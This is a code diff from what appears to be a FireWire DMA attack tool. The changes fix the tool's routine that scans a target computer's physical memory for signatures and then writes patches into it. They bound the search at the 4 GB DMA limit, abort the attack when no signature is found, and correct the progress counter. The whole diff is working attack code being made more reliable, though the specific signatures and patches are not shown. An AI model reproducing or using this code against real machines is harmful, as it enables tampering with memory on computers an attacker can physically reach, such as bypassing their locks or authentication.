@@ -129,17 +129,19 @@ def run(context):
         d = initialize_fw(d)
     
     # Attack
-    print()
     print_msg('+', 'Starting attack...')
     for i, phase in enumerate(phases):
         try:
             # Find
             if not one_phase: print_msg('+', 'Phase ' + str(i + 1) + ':')
             addr = findsig(d, phase.sig, phase.offset)
+            if not addr:
+                s._success = False
+                break
             print()
             print_msg('+', 'Signature found at 0x%x.' % addr)
             # Patch and verify if not dry run
-            if not ctx.dry_run: 
+            if not ctx.dry_run:
                 d.write(addr, phase.patch)
                 if d.read(addr, len(phase.patch)) == phase.patch:
                     print_msg('+', 'Write-back verified; patching successful.')
@@ -226,22 +228,24 @@ def initialize_fw(d):
     d = b.devices()[0]
     d.open()
     print()
-    print_msg('+', 'Done, attacking!\n')
     return d
 
 
 def findsig(d, sig, off):
     # Skip the first 1 MiB of memory
-    addr = 1 * 1024 * 1024 + off
+    one_mib = 1 * 1024 * 1024
+    addr = one_mib + off
     # An array to store the last read values of data so that we can assess if
     # we're sucking data through the wire or not
     buf = collections.deque(ctx.buflen * [0], ctx.buflen)
-    while True:
+    # Make sure we don't go outside of FireWire max DMA address 0xffffffff (4GB)
+    fw_max_addr = 4 * 1024 * one_mib
+    while addr < fw_max_addr:
         # Prepare a batch of 128 requests
         r = [(addr + ctx.PAGESIZE * i, len(sig)) for i in range(0, 128)]
         for caddr, cand  in d.readv(r):
             if cand == sig: return caddr
-        mibaddr = math.floor(addr / (1024 * 1024))
+        mibaddr = math.floor((addr + one_mib) / (one_mib)) # Account for the first MiB
         sys.stdout.write('[+] Searching for signature, {0:>4d} MiB so far.'.format(mibaddr))
         if ctx.verbose:
             sys.stdout.write(' Data read: 0x{0}'.format(hexlify(cand).decode(ctx.encoding)))
@@ -263,6 +267,8 @@ def findsig(d, sig, off):
                 buf = collections.deque(buf.maxlen * 2 * [0], buf.maxlen * 2)
         
         addr += ctx.PAGESIZE * 128
+    return
+
 
 def fail(msg):
     print_msg('!', msg)
